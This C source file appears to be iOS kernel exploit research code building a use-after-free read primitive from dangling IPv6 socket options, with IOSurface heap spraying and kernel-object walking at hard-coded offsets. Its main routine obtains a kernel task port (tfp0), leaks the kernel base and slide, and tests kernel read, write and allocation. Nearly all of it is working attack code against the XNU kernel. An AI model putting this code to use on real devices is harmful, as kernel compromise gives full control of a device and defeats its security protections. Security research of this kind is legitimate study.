#include <stdio.h>
#include <mach/mach.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include "krw.h"
#include "helper.h"
#include "socket.h"
#include "iokit.h"
#include "os_unserialize.h"
#include "find_port.h"

mach_port_t tfp0;

extern uint64_t kbase;
extern uint64_t kslide;

// An IOSurfaceRootUserClient instance.
extern mach_port_t IOSurfaceRootUserClient;

// The ID of the IOSurface we're using.
extern uint32_t IOSurface_id;

// Will obtain dangling kptrs from "read_20_via_uaf" function.
uint64_t dangling_kptrs[128];

struct kDictEntry {
    uint64_t key;
    uint64_t value;
};

struct kOSDict {
    uint64_t self_addr;
    uint64_t items_addr;
    uint32_t count;
    uint32_t cap;
    char **names;
    struct kDictEntry *items;
    char data[0];
};

//Thanks pattern-f, https://github.com/pattern-f/TQ-pre-jailbreak/blob/main/mylib/k_utils.c#L173
struct kOSDict *kernel_fetch_dict(uint64_t dict_addr)
{
    char obj[0x28];
    kreadbuf(dict_addr, obj, sizeof(obj));
    uint32_t cap = *(uint32_t *)(obj + 0x24); // 0x24 = p/x offsetof(OSDictionary, capacity)
    struct kOSDict *dict;
    size_t alloc_size = sizeof(*dict) + cap * (sizeof(struct kDictEntry) + sizeof(char *) + 256);
    dict = (struct kOSDict *)malloc(alloc_size);
    dict->self_addr = dict_addr;
    dict->cap = cap;
    dict->count = *(uint32_t *)(obj + 0x20); // 0x20 = p/x offsetof(OSDictionary, count)
    dict->items_addr = kread64(dict_addr + 0x18); // 0x18 = p/x offsetof(OSDictionary, dictionary)
    char *ptr = dict->data;
    dict->items = (struct kDictEntry *)ptr;
    ptr += sizeof(struct kDictEntry) * dict->cap;
    dict->names = (char **)ptr;
    ptr += sizeof(char *) * dict->cap;
    for (int i = 0; i < dict->cap; i++) {
        dict->names[i] = ptr;
        ptr += 256;
    }
    INFO("dict %#llx, items %#llx, count %u, capacity %u\n",
            dict->self_addr, dict->items_addr, dict->count, dict->cap);
	
    alloc_size = sizeof(struct kDictEntry) * dict->cap;
    kreadbuf(dict->items_addr, dict->items, alloc_size);
    for (int i = 0; i < dict->count; i++) {
        char obj[0x18];
        kreadbuf(dict->items[i].key, obj, sizeof(obj));
        // OSSymbol
        uint32_t len = *(uint32_t *)(obj + 0xc) >> 14;
        if (len >= 256) {
            len = 255;
        }
        uint64_t string = *(uint64_t *)(obj + 0x10);	//0x10 = p/x offsetof(OSString, string)
        kreadbuf(string, dict->names[i], len);
        dict->names[i][len] = 0;
        // INFO("    -> %s\n", dict->names[i]);
    }
    return dict;
}

// OSArray stuffs
// OSObject_1 *__fastcall OSArray::getObject(const OSArray_1 *this, unsigned int index)
uint64_t OSArray_objectAtIndex(uint64_t array, int idx) {
    uint64_t array_buffer = kread64(array + 0x18); // 0x18 = p/x offsetof(OSArray, array)
    return kread64(array_buffer + idx * sizeof(uint64_t));
}

uint64_t OSData_buffer(uint64_t osdata) {
    return kread64(osdata + 0x10);	// 0x10 = p/x offsetof(OSData, data)
}

bool is_our_sprayed_OSArray(uint64_t osarray) {
	uint32_t osarray_count = kread32(osarray + 0x20);	// 0x20 = p/x offsetof(OSArray, count)
	uint32_t osarray_capacity = kread32(osarray + 0x24);	// 0x24 = p/x offsetof(OSArray, capacity)
	
	if(osarray_count != 256)	return false;

	for(int i = 0; i < 256; i++) {
		uint64_t osdata_in_osarray = OSArray_objectAtIndex(osarray, i);
		uint64_t kbuffer = OSData_buffer(osdata_in_osarray);
		if(kread64(kbuffer + offsetof(struct ip6_pktopts, ip6po_minmtu)) != 0x41424344) return false;

		printf("our sprayed 192bytes OSArray[%d] = 0x%llx\n", i, kbuffer);

		for(int i = 0; i < sizeof(dangling_kptrs) / sizeof(uint64_t); i++) {
			if(kbuffer == dangling_kptrs[i]) {
				INFO("DANGLING KPTR REUSE DETECTED!!! kbuffer(0x%llx) == dangling_kptrs[%d](0x%llx)\n", kbuffer, i, dangling_kptrs[i]);
			}
		}
	}

	return true;
}


// obtain userdict from IOSurface
//Thanks @jmpews, https://gist.github.com/jmpews/01b520993a742f72714cd06e40793eed
uint64_t userdict_from_IOSurface(void) {
	uint64_t surfRoot = port_to_kobject(IOSurfaceRootUserClient);
	// INFO("surfRoot: 0x%llx\n", surfRoot);

	// p/x offsetof(IOSurfaceRootUserClient, IOSurfaceClientArray) = 0x118;
	uint64_t surfClients = kread64(surfRoot + 0x118);
	// INFO("surfClients: 0x%llx\n", surfClients);

	uint64_t surfClient = kread64(surfClients + sizeof(uint64_t) * IOSurface_id);
	// INFO("surfClient: 0x%llx\n", surfClient);

	// p/x offsetof(IOSurfaceClient, IOSurface) = 0x40;
	uint64_t surface = kread64(surfClient + 0x40);
	// INFO("surface: 0x%llx\n", surface);

	// p/x offsetof(IOSurface, UserspaceValueDictionary) = 0xd0
	uint64_t userspaceValueDict = kread64(surface + 0xd0);

	if(userspaceValueDict != 0) return userspaceValueDict;

	return 0;
}

// second primitive: read 20 bytes from addr
void* read_20_via_uaf(uint64_t addr) {
    // create a bunch of sockets
    int sockets[128];
    for (int i = 0; i < 128; i++) {
        sockets[i] = get_socket_with_dangling_options();
		dangling_kptrs[i] = get_dangling_ip6_pktopts_kaddr(sockets[i]);
    }
 
	for (int i = 0; i < 128; i++) {
        INFO("dangling_kptr = 0x%llx; obtained from socket_fd=%d\n", dangling_kptrs[i], sockets[i]);
    }

    
    // create a fake struct with our dangling port address as its pktinfo
    struct ip6_pktopts *fake_opts = calloc(1, sizeof(struct ip6_pktopts));
    fake_opts->ip6po_minmtu = 0x41424344; // give a number we can recognize
    *(uint32_t*)((uint64_t)fake_opts + 164) = 0x41424344; // on iOS 10, offset is different
    fake_opts->ip6po_pktinfo = (struct in6_pktinfo*)addr;
    
    bool found = false;
    int found_at = -1;
    
	int spray_IOSurface_call_count = 0;
    for (int i = 0; i < 20; i++) { // iterate through the sockets to find if we overwrote one
        spray_IOSurface((void *)fake_opts, sizeof(struct ip6_pktopts));
		spray_IOSurface_call_count++;
        
        for (int j = 0; j < 128; j++) {
            int minmtu = -1;
            get_minmtu(sockets[j], &minmtu);
            if (minmtu == 0x41424344) { // found it!
                found_at = j; // save its index
                found = true;
                break;
            }
        }
        if (found) break;
    }
	INFO("spray_IOSurface_call_count: %d\n", spray_IOSurface_call_count);

	uint64_t userspaceValueDict = userdict_from_IOSurface();
	INFO("userspaceValueDict: 0x%llx\n", userspaceValueDict);

	struct kOSDict *dict = kernel_fetch_dict(userspaceValueDict);

	int sprayed_osarray_found_count = 0;
    for (int i = 0; i < dict->count; i++) {
		if(is_our_sprayed_OSArray(dict->items[i].value)) {
			INFO("sprayed OSArray: 0x%llx\n\n", dict->items[i].value);
			sprayed_osarray_found_count++;
		}
    }
	INFO("sprayed_osarray_found_count = %d\n", sprayed_osarray_found_count);




	
    
    free(fake_opts);
    
    if (!found) {
        printf("[-] Failed to read kernel\n");
        return 0;
    }
    
    for (int i = 0; i < 128; i++) {
        if (i != found_at) {
            close(sockets[i]);
        }
    }
    
    void *buf = malloc(sizeof(struct in6_pktinfo));
    get_pktinfo(sockets[found_at], (struct in6_pktinfo *)buf);
    close(sockets[found_at]);
    
    return buf;
}

uint64_t rk64_via_uaf(uint64_t addr) {
    void *buf = read_20_via_uaf(addr);
    if (buf) {
        uint64_t r = *(uint64_t*)buf;
        free(buf);
        return r;
    }
    return 0;
}




int main() {
	
   	int ret = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &tfp0);
	printf("ret: 0x%x, hsp4: 0x%x\n", ret, tfp0);

	int r = get_kbase(&kbase);
    printf("get_kbase ret: %d, kbase: 0x%llx, kslide: 0x%llx\n", r, kbase, kslide);

	IOSurface_init();

	uint64_t surfRoot = port_to_kobject(IOSurfaceRootUserClient);
	INFO("surfRoot: 0x%llx\n", surfRoot);

	//Thanks @jmpews, https://gist.github.com/jmpews/01b520993a742f72714cd06e40793eed
	// p/x offsetof(IOSurfaceRootUserClient, IOSurfaceClientArray) = 0x118;
	uint64_t surfClients = kread64(surfRoot + 0x118);
	INFO("surfClients: 0x%llx\n", surfClients);

	uint64_t surfClient = kread64(surfClients + sizeof(uint64_t) * IOSurface_id);
	INFO("surfClient: 0x%llx\n", surfClient);

	// p/x offsetof(IOSurfaceClient, IOSurface) = 0x40;
	uint64_t surface = kread64(surfClient + 0x40);
	INFO("surface: 0x%llx\n", surface);

	uint64_t kptr = kalloc(8);
	kwrite64(kptr, 0xc0debabe13371338);
	INFO("kptr = 0x%llx -> kread64: 0x%llx\n", kptr, kread64(kptr));

	INFO("rk64_via_uaf(kptr) = 0x%llx\n", rk64_via_uaf(kptr));

	kfree(kptr, 8);

	IOSurface_deinit(); 

	return 0;
}
